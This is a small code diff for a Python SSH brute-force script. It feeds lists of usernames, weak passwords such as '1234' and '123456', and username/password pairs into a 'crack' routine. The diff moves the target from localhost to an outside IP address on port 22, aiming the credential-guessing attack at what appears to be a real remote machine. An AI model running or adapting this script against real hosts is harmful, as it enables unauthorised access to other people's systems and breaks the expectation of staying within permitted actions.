@@ -2,7 +2,7 @@ import ssh
 
 d1 = {'usernames':['cacho', 'rojo', 'hacker'],
      'passwords':['1234', '12345', '123456', '111112', 'hacker', '54321', '654321'],
-     'pairs':[('admin', 'admin'), ('cacho', '111111')]}
+     'pairs':[('cacho', 'admin'), ('cacho', '111111')]}
 
 d2 = {'usernames':[],
       'passwords':[],
@@ -17,6 +17,6 @@ def retry_callback(attempt):
         return True
     return False
 
-c = ssh.SSH(success_callback, retry_callback, "127.0.0.1", 22)
+c = ssh.SSH(success_callback, retry_callback, "163.10.42.254", 22)
 
 c.crack(**d1)
